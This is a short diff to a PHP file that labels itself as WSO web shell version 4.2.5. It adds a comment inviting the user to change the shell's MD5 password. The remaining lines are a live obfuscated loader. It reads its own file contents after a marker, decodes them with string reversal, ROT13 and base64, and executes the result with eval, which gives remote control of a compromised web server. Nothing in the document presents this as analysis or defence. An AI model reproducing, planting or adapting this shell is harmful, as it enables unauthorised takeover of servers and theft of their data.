@@ -1,5 +1,6 @@
 <?php
 ////wso shell 4.2.5
+////You can change the md5 password
 $paswoord = "59e8d97dbcc1d0f65dea6ecd0e9fbe39"; //xleet
 $bn_d7624002cad982b3=array(base64_decode("L3gvaQ=="),base64_decode("eA=="),base64_decode(strrev(str_rot13(explode(base64_decode("Pz4="),file_get_contents(__FILE__))[1]))));preg_replace($bn_d7624002cad982b3[0],serialize(eval($bn_d7624002cad982b3[2])),$bn_d7624002cad982b3[1]);exit();
 ?>
